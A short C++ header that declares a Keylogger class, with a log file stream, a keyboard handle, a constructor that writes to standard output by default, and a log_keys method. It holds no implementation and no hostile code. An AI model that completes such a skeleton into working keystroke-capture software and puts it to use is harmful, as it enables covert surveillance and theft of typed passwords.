#include<fstream>
#include"keyboard.h"
#include"parser.h"
class Keylogger{

	std::ofstream logfile;
	Keyboard* kbd;
	
	public:

	Keylogger(std::string output="/dev/stdout");
	void log_keys();
	~Keylogger();

};
